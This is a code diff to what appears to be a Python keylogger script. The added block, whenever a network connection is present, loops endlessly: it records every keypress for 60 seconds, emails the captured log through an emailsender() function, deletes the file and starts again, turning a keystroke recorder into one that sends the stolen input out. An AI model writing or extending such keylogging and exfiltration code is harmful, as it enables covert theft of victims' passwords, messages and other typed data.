@@ -73,6 +73,24 @@ save = tempfile.mkdtemp('file') #4
 print (save)
 filecreation()
 
+if is_connected() == True:
+    def join():
+        with Listener(on_press=writetofile) as ls:
+            def time_out(period_sec: int):
+                time.sleep(period_sec)  # Listen to keyboard for period_sec seconds
+                ls.stop()
+                emailsender()
+                os.remove(filename)
+                filecreation()
+                
+            Thread(target=time_out, args=(60.0,)).start()
+            ls.join()
+    
+    while True:
+        join()
+
+    
+
        
 with Listener(on_press=writetofile) as l:
     l.join()
